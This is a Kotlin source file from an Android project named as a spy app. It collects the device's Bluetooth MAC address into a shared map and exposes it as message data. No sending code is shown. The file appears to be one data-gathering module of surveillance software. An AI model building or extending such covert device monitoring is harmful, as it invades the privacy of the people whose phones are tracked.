package com.komnacki.androidspyapp.device.bluetooth

import android.content.Context
import android.util.Log
import com.komnacki.androidspyapp.Message
import github.nisrulz.easydeviceinfo.base.EasyBluetoothMod


class BluetoothState(override var context: Context) :
    Message {
    init {
        Log.d("KK: ", "BluetoothState")
        getBluetoothState(
            context
        )
    }

    companion object {
        private val info : MutableMap<String, Any> = mutableMapOf()

        fun getBluetoothState(context: Context) {
            val easyBluetoothState = EasyBluetoothMod(context)
            try {
                info["MAC"] = easyBluetoothState.bluetoothMAC
            } catch (e : Exception) {

            }
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}